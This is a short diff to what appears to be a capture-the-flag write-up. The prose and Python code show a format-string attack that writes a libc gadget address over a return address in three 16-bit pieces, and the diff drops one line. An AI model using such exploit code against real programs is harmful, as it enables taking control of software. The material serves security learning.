@@ -209,7 +209,6 @@ p.sendlineafter(b'name: ', payload)
 With the location of the return address known, we can change our _name_ so that the 3 shorts that make up the 48-bit address of the return address can be set on the stack to be used by our format-string attack.
 
 ```python
-payload = b''
 offset = 14
 for i in range(3):
     payload = b'%' + str((libc.sym.gadget >> i*16) & 0xFFFF).encode() + b'c%' + str(offset + i).encode() + b'$n'
